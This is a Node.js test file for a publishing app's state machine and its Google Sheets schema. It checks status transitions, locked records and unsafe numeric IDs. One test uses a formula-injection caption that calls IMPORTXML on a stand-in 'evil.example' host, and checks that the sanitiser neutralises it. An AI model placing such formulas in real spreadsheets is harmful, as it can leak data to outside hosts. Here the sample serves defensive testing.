import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import {
  assertValidTransition,
  canTransition,
  isInFlightStatus,
  isLockedRecord,
  isPublishedRecord,
} from '../../lib/domain/state-machine';
import {
  LEGACY_MAIN_COLUMNS,
  MAIN_SHEET_COLUMNS,
  normalizeContentRecord,
  toSafeSheetRow,
} from '../../lib/domain/schema';

describe('State machine & Google Sheets schema invariants', () => {
  it('enforces strict two-stage transitions and prevents DRAFT -> PUBLISHED skip', () => {
    assert.equal(canTransition('DRAFT', 'EXTRACTING'), true);
    assert.equal(canTransition('EXTRACTING', 'DRAFT'), true);
    assert.equal(canTransition('EXTRACTING', 'READY'), true);
    assert.equal(canTransition('DRAFT', 'PUBLISHED'), false);
    assert.equal(canTransition('READY', 'PUBLISHING'), true);
    assert.equal(canTransition('PUBLISHING', 'PUBLISHED'), true);
    assert.equal(canTransition('PUBLISHING', 'VERIFY_MANUALLY'), true);
    assert.equal(canTransition('VERIFY_MANUALLY', 'PUBLISHED'), true);
    assert.throws(() => assertValidTransition('DRAFT', 'PUBLISHED'), /Invalid state transition/);
  });

  it('recognizes locked and in-flight statuses accurately', () => {
    assert.equal(isInFlightStatus('EXTRACTING'), true);
    assert.equal(isInFlightStatus('UPLOADING'), true);
    assert.equal(isInFlightStatus('PUBLISHING'), true);
    assert.equal(isInFlightStatus('DELETING'), true);
    assert.equal(isInFlightStatus('DRAFT'), false);

    const publishedRow = normalizeContentRecord({ post_id: 'P1', status: 'DRAFT', published_id: '180123456' });
    assert.equal(isPublishedRecord(publishedRow), true);
    assert.equal(isLockedRecord(publishedRow), true);

    const schedRow = normalizeContentRecord({ post_id: 'P2', status: 'SCHEDULED' });
    assert.equal(isLockedRecord(schedRow), true);

    const draftRow = normalizeContentRecord({ post_id: 'P3', status: 'DRAFT' });
    assert.equal(isLockedRecord(draftRow), false);
  });

  it('preserves all 15 legacy columns in exact order and protects spreadsheet cells', () => {
    assert.equal(MAIN_SHEET_COLUMNS.slice(0, 15).join(','), LEGACY_MAIN_COLUMNS.join(','));
    assert.equal(MAIN_SHEET_COLUMNS.length, 52);

    const dirty = normalizeContentRecord({
      id: '550e8400-e29b-41d4-a716-446655440000',
      post_id: 'P_FORMULA',
      caption: '=IMPORTXML("https://evil.example", "//a")',
      status: 'DRAFT',
    });
    const safeRow = toSafeSheetRow(dirty);
    assert.ok(String(safeRow.caption).startsWith("'="));
    assert.equal(safeRow.post_uuid, '550e8400-e29b-41d4-a716-446655440000');
  });

  it('flags unsafe scientific-notation or formula-corrupted numeric IDs', () => {
    const sci = normalizeContentRecord({ post_id: 'P_SCI', published_id: '1.80123E+16', status: 'PUBLISHED' });
    assert.equal(sci.error_code, 'UNSAFE_NUMERIC_ID');
    assert.match(sci.error, /numeric ID corruption/i);
  });
});
